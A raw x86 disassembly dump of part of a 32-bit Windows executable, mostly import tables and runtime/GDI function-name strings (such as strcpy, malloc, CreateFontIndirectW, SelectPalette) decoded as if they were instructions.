  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
